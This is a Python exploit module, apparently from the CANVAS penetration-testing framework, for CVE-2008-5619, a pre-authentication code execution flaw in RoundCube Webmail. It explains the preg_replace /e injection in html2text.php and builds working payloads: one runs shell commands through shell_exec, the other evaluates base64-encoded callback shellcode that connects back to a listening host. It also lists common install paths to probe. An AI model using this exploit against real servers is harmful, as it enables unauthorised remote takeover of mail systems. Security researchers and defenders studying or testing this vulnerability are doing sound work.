#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.phpexploit import *
import canvasengine
import urllib
import libs.spkproxy as spkproxy #for urlopen

NAME="RoundCube Code Execution"
DESCRIPTION="RoundCube Webmail Pre-Authentication Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Roundcube.net"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="CVE-2008-5619"
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5619"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]=["None"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Bug is in /bin/html2text.php which accepts HTTP_RAW_POST_DATA as
user supplied input that later is run through a preg_replace() call 
inside of the html2text library.

Bug:
var $search = array(
...
Line 120: '/<b[^>]*>(.+?)<\/b>/ie', // <b> [0]
...
var $replace = array(
...
Line 169: 'strtoupper("\\1")', // <b> [1]
...
Line 381: $text = preg_replace($this->search, $this->replace, $text); [2]
...

[0] the regex will match anthing in between <b> and </b> and will evaluate the results as php /e modifier
[1] will uppercase anything found in [0] but is in double quotes so code will be evaluted as phpcode
[2] this is where it is all put together and the bug is exploited.

Anthing that includes the html2text library is vulnerable.
"""

CHANGELOG="""
"""

class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/webmail/","/mail/","/roundcubemail-0.1.1/","/"]
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.verb="POST"
        self.content_type="text/plain"
        self.targetpath="bin/html2text.php"
        self.foundstrings=["roundcube"]
        self.testfile="index.php"
        
        return
    
    def getbody(self):
        """
        Creates a preg_replace exploit string that either executes a command
        or uses our callback shellcode
        """
        
        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command=self.encode_php(command)
            exp="<b>{${print shell_exec("+command+")}}</b>"
        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command).strip()
            command=self.encode_php(command)
            exp="<b>{${eval(base64_decode("+command+"))}}</b>"
        return exp 
    
    def parse_command_response(self, data):
        """
        Give me the result of my command
        """
        return data
    
    def usage(self):
	print "Example: "+sys.argv[0]+" -t 172.16.104.128 -l 10.10.10.227 -d 9898"
	print "-t <target ip>"
	print "-p <target port>                 [optional]"
	print "-O basepath: /path/to/roundcube/ [optional]"
	print "-O hostname: target vhost        [optional]"
	print "-O command:commandtorun          [optional]"
	print "-l call back ip if doing connect back"
	print "-d listening port for call back"
	return
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
